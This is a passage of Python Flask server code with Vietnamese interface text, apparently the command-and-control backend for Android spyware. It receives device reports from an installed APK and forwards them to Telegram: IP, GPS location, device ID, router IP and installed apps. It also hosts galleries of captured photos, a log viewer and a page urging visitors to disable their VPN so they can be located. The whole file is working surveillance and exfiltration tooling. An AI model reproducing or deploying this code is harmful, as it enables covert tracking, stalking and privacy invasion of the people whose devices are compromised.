        app_list = '\n'.join([f"• {a.get('name','?')}" for a in user_apps[:40]])
        if len(user_apps) > 40:
            app_list += f"\n... và {len(user_apps) - 40} app khác"
        
        caption = (
            f"📊 <b>BÁO CÁO THIẾT BỊ</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
            f"📱 <b>Máy:</b> {device.get('manufacturer','?')} {device.get('model','?')}\n"
            f"🤖 <b>Android:</b> {device.get('android_version','?')}\n"
            f"🔑 <b>Device ID:</b> <code>{device.get('device_id','?')}</code>\n"
            f"📍 <b>GPS:</b> {lat}, {lon}\n"
            f"🏳️ <b>Quốc gia:</b> {geo.get('country','?')}\n"
            f"📡 <b>ISP:</b> {geo.get('isp','?')}\n"
            f"📶 <b>Router:</b> <code>{router_ip or 'N/A'}</code>\n"
            f"📦 <b>Apps:</b> {total} (user: {len(user_apps)})\n"
            f"⏰ <b>Thời gian:</b> {now}\n"
        )
        if gmaps != 'N/A':
            caption += f"━━━━━━━━━━━━━━━━━━━━\n🗺️ <a href='{gmaps}'>MỞ GOOGLE MAPS</a>\n"
        caption += f"━━━━━━━━━━━━━━━━━━━━\n<b>Top app:</b>\n{app_list}"
        
        send_telegram_text(caption)
        
        if lat and lon:
            send_telegram_location(lat, lon)
        
        return jsonify({
            'status': 'ok',
            'received': total,
            'router': router_ip,
            'gmaps': gmaps,
        })
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500


@app.route('/apps')
def view_apps():
    try:
        files = sorted(os.listdir(CONFIG['REPORT_DIR']), reverse=True)
        html = '''<!DOCTYPE html><html><head><meta charset="UTF-8">
        <title>Danh sách App</title>
        <style>
            body{font-family:Arial;padding:20px;background:#0f172a;color:#e2e8f0;}
            h1{color:#38bdf8;} a{color:#38bdf8;}
            .device{background:#1e293b;padding:20px;border-radius:12px;margin:15px 0;border-left:5px solid #10b981;}
            .app{background:#334155;padding:8px 12px;border-radius:6px;margin:4px 0;
                 display:flex;justify-content:space-between;align-items:center;font-size:13px;}
            .app:hover{background:#475569;}
            .name{color:#f1f5f9;font-weight:600;}
            .pkg{color:#94a3b8;font-size:11px;font-family:monospace;}
            .badge{display:inline-block;padding:2px 8px;border-radius:6px;font-size:10px;font-weight:bold;}
            .user{background:#10b981;color:#fff;}
            .sys{background:#6b7280;color:#fff;}
            .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:15px 0;}
            .stat{background:#334155;padding:12px;border-radius:8px;text-align:center;}
            .stat-num{font-size:22px;color:#38bdf8;font-weight:bold;}
            .stat-label{font-size:11px;color:#94a3b8;}
            .tabs{display:flex;gap:10px;margin:15px 0;}
            .tab{padding:8px 16px;background:#1e293b;border-radius:8px;cursor:pointer;
                 color:#94a3b8;font-size:13px;border:2px solid transparent;}
            .tab.active{background:#10b981;color:#fff;border-color:#10b981;}
            .gmaps-btn{display:inline-block;padding:8px 16px;background:#4285F4;color:#fff;
                      text-decoration:none;border-radius:8px;margin:8px 0;font-size:13px;font-weight:bold;}
            .gmaps-btn:hover{background:#3367D6;}
            .coords{font-family:monospace;font-size:12px;color:#fbbf24;}
        </style>
        <script>
            function showTab(type) {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.app').forEach(a => a.style.display = 'none');
                if (type === 'user') {
                    document.querySelector('.tab-user').classList.add('active');
                    document.querySelectorAll('.app.user-app').forEach(a => a.style.display = 'flex');
                } else if (type === 'system') {
                    document.querySelector('.tab-sys').classList.add('active');
                    document.querySelectorAll('.app.sys-app').forEach(a => a.style.display = 'flex');
                } else {
                    document.querySelector('.tab-all').classList.add('active');
                    document.querySelectorAll('.app').forEach(a => a.style.display = 'flex');
                }
            }
        </script>
        </head><body>'''
        html += '<h1>📱 Danh sách App đã nhận</h1>'
        html += '<p><a href="/">← Home</a> | <a href="/apps">🔄 Refresh</a></p>'
        
        if not files:
            html += '<p style="color:#94a3b8;">Chưa có dữ liệu. Cài APK và mở lên để gửi danh sách app.</p>'
        else:
            for f in files[:10]:
                try:
                    with open(f'{CONFIG["REPORT_DIR"]}/{f}', encoding='utf-8') as fp:
                        data = json.load(fp)
                    d = data.get('device', {})
                    loc = data.get('location', {})
                    apps = data.get('apps', [])
                    user_apps = [a for a in apps if a.get('is_user')]
                    system_apps = [a for a in apps if a.get('is_system')]
                    
                    html += f'<div class="device">'
                    html += f'<h3>🌐 {data.get("ip")}</h3>'
                    html += f'<p>📱 {d.get("manufacturer","?")} {d.get("model","?")} | Android {d.get("android_version","?")}</p>'
                    html += f'<p>📶 Router: <b>{data.get("router_ip","N/A")}</b> | 💻 LAN: {data.get("local_ip","N/A")}</p>'
                    
                    if loc.get('lat') and loc.get('lon'):
                        lat, lon = loc.get('lat'), loc.get('lon')
                        html += f'<p class="coords">📍 GPS: {lat}, {lon} (±{loc.get("accuracy", 0):.0f}m)</p>'
                        html += f'<a class="gmaps-btn" href="{data.get("gmaps", "#")}" target="_blank">🗺️ Mở Google Maps</a>'
                    
                    html += f'<p>⏰ {data.get("time","?")}</p>'
                    
                    html += '<div class="stats">'
                    html += f'<div class="stat"><div class="stat-num">{len(apps)}</div><div class="stat-label">Tổng</div></div>'
                    html += f'<div class="stat"><div class="stat-num">{len(user_apps)}</div><div class="stat-label">Người dùng</div></div>'
                    html += f'<div class="stat"><div class="stat-num">{len(system_apps)}</div><div class="stat-label">Hệ thống</div></div>'
                    html += '</div>'
                    
                    html += '<div class="tabs">'
                    html += '<div class="tab tab-all active" onclick="showTab(\'all\')">Tất cả</div>'
                    html += '<div class="tab tab-user" onclick="showTab(\'user\')">Người dùng</div>'
                    html += '<div class="tab tab-sys" onclick="showTab(\'system\')">Hệ thống</div>'
                    html += '</div>'
                    
                    for a in user_apps:
                        name = a.get('name', '?')
                        pkg = a.get('package', '?')
                        ver = a.get('version', '?')
                        html += f'<div class="app user-app"><div><div class="name">{name}</div><div class="pkg">{pkg} • v{ver}</div></div><span class="badge user">USER</span></div>'
                    
                    for a in system_apps:
                        name = a.get('name', '?')
                        pkg = a.get('package', '?')
                        html += f'<div class="app sys-app" style="display:none;"><div><div class="name">{name}</div><div class="pkg">{pkg}</div></div><span class="badge sys">SYS</span></div>'
                    
                    html += '</div>'
                except:
                    continue
        
        html += '</body></html>'
        return html
    except Exception as e:
        return f'<h1>Lỗi: {e}</h1>'


@app.route('/photos/<path:filename>')
def serve_photo(filename):
    return send_from_directory(CONFIG['PHOTO_DIR'], filename)


@app.route('/gallery')
def gallery():
    try:
        files = sorted(os.listdir(CONFIG['PHOTO_DIR']), reverse=True)
        html = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Gallery</title>
<style>
body{font-family:Arial;padding:20px;background:#0f172a;color:#e2e8f0;}
h1{color:#38bdf8;} a{color:#38bdf8;}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px;}
.item{background:#1e293b;padding:10px;border-radius:10px;}
</style></head><body>'''
        html += f'<h1>📸 Ảnh đã chụp ({len(files)})</h1>'
        html += '<p><a href="/">← Home</a> | <a href="/gallery">🔄 Refresh</a></p>'
        html += '<div class="grid">'
        for f in files[:50]:
            html += f'<div class="item"><a href="/photos/{f}" target="_blank"><img src="/photos/{f}" style="width:100%;border-radius:8px;"></a><p style="font-size:11px;color:#94a3b8;margin-top:6px;">{f}</p></div>'
        html += '</div></body></html>'
        return html
    except:
        return '<h1>Chưa có ảnh</h1>'


@app.route('/log')
def view_log():
    try:
        with open(CONFIG['LOG_FILE'], encoding='utf-8') as f:
            lines = f.readlines()[-200:]
        content = ''.join(reversed(lines)).replace('<', '&lt;')
        # Highlight Maps link
        content = re.sub(
            r'(https://www\.google\.com/maps\?q=[^\s]+)',
            r'<a href="\1" target="_blank" style="color:#4285F4;">\1</a>',
            content
        )
        return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Log</title>
<style>
body{{background:#0f172a;color:#94a3b8;font-family:monospace;padding:20px;line-height:1.7;}}
h1{{color:#38bdf8;border-bottom:2px solid #1e293b;padding-bottom:10px;}}
pre{{white-space:pre-wrap;word-break:break-all;font-size:13px;}}a{{color:#38bdf8;}}
</style></head><body>
<h1>📋 Log ({len(lines)} dòng)</h1>
<p><a href="/">← Home</a> | <a href="/log">🔄 Refresh</a></p>
<pre>{content}</pre></body></html>'''
    except:
        return '<pre style="color:#ef4444">Chưa có log</pre>'


@app.route('/network')
def network():
    return jsonify({
        'local_ip': get_local_ip(),
        'router_ip': get_router_ip(),
        'mac': get_mac_address(),
        'hostname': socket.gethostname(),
        'time': datetime.now().isoformat(),
    })


@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'port': CONFIG['PORT'],
        'router_ip': get_router_ip(),
        'local_ip': get_local_ip(),
    })


def blocked_page(ip, reason, vpn):
    return f'''<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><title>Tắt VPN</title>
<style>
body{{font-family:Arial;background:linear-gradient(135deg,#1e1b4b,#7f1d1d);
min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#fff;}}
.card{{background:rgba(30,27,75,0.9);border:2px solid #ef4444;border-radius:20px;
padding:40px;max-width:500px;text-align:center;}}
.icon{{font-size:70px;}}h1{{color:#fca5a5;margin:15px 0;}}
p{{line-height:1.7;margin-bottom:20px;}}
.ip{{background:rgba(0,0,0,0.4);padding:12px;border-radius:8px;font-family:monospace;margin:15px 0;}}
.btn{{padding:12px 30px;background:#10b981;color:white;border:none;border-radius:10px;
font-weight:600;cursor:pointer;font-size:15px;}}
</style></head><body><div class="card">
<div class="icon">🚫</div><h1>Vui lòng tắt VPN</h1>
<p>Phát hiện <strong>{reason}</strong>.<br>Vui lòng tắt VPN và thử lại.</p>
<div class="ip">IP: {ip}</div>
<button class="btn" onclick="location.reload()">🔄 Thử lại</button>
</div></body></html>'''


# ═══════════════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════════════
def print_banner():
    local_ip = get_local_ip()
    router_ip = get_router_ip()
    mac = get_mac_address()
    W = 74
    
    print()
    print(clr('╔' + '═' * W + '╗', C.GREEN + C.BOLD))
    print(clr('║', C.GREEN + C.BOLD) + clr('  🛡️  SERVER - IP + GPS + APP + MAPS'.center(W), C.WHITE + C.BOLD) + clr('║', C.GREEN + C.BOLD))
    print(clr('╠' + '═' * W + '╣', C.GREEN + C.BOLD))
    print(clr('║', C.GREEN + C.BOLD) + f"  {clr('► Local:', C.CYAN)} http://localhost:{CONFIG['PORT']}".ljust(W + 15) + clr('║', C.GREEN + C.BOLD))
    print(clr('║', C.GREEN + C.BOLD) + f"  {clr('► LAN:', C.CYAN)}   http://{local_ip}:{CONFIG['PORT']}".ljust(W + 15) + clr('║', C.GREEN + C.BOLD))
    print(clr('║', C.GREEN + C.BOLD) + f"  {clr('► Gallery:', C.CYAN)} http://localhost:{CONFIG['PORT']}/gallery".ljust(W + 15) + clr('║', C.GREEN + C.BOLD))
    print(clr('║', C.GREEN + C.BOLD) + f"  {clr('► Apps:', C.CYAN)}  http://localhost:{CONFIG['PORT']}/apps".ljust(W + 15) + clr('║', C.GREEN + C.BOLD))
    print(clr('║', C.GREEN + C.BOLD) + f"  {clr('► Log:', C.CYAN)}   http://localhost:{CONFIG['PORT']}/log".ljust(W + 15) + clr('║', C.GREEN + C.BOLD))
    print(clr('╠' + '═' * W + '╣', C.GREEN + C.BOLD))
    print(clr('║', C.GREEN + C.BOLD) + f"  {clr('💻 IP LAN máy chủ:', C.YELLOW)}  {clr(local_ip, C.WHITE + C.BOLD)}".ljust(W + 25) + clr('║', C.GREEN + C.BOLD))
    print(clr('║', C.GREEN + C.BOLD) + f"  {clr('📶 IP Router:', C.YELLOW)}       {clr(router_ip or 'N/A', C.GREEN + C.BOLD)}".ljust(W + 25) + clr('║', C.GREEN + C.BOLD))
    if mac:
        print(clr('║', C.GREEN + C.BOLD) + f"  {clr('🔖 MAC Address:', C.YELLOW)}     {clr(mac, C.DIM)}".ljust(W + 28) + clr('║', C.GREEN + C.BOLD))
    print(clr('║', C.GREEN + C.BOLD) + f"  {clr('🏠 Hostname:', C.YELLOW)}        {clr(socket.gethostname(), C.WHITE)}".ljust(W + 25) + clr('║', C.GREEN + C.BOLD))
    print(clr('╚' + '═' * W + '╝', C.GREEN + C.BOLD))
    print()
    print(clr(f'  ⏳ Đang lắng nghe trên cổng {CONFIG["PORT"]}...', C.YELLOW))
    print()


# ═══════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    print_banner()
    try:
        app.run(
            host=CONFIG['HOST'],
            port=CONFIG['PORT'],
            debug=False,
            threaded=True,
            use_reloader=False,
        )
    except KeyboardInterrupt:
        print(clr('\n[!] Đã dừng server.', C.RED))
    except Exception as e:
        print(clr(f'\n[!] Lỗi: {e}', C.RED))